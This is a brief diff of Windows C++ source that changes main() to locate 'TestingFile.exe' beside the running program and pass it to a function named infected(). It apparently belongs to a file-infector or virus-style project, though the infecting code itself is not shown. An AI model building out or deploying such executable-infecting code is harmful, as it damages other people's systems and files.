@@ -146,9 +146,10 @@ void infected(char* lpTargetFile) {
 
 int main(int argc, char* argv[])
 {
-	const char* path = "C:\\Users\\Dell\\Downloads\\TestingFile.exe";
-	char lpTargetPath[MAX];
-	strcpy(lpTargetPath, path);
-	infected(lpTargetPath);
+	char* pPath = new char[MAX_PATH];
+	GetModuleFileNameA(0, pPath, MAX_PATH);
+	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
+	strcat(pPath, "TestingFile.exe");
+	infected(pPath);
 	return 0;
 }
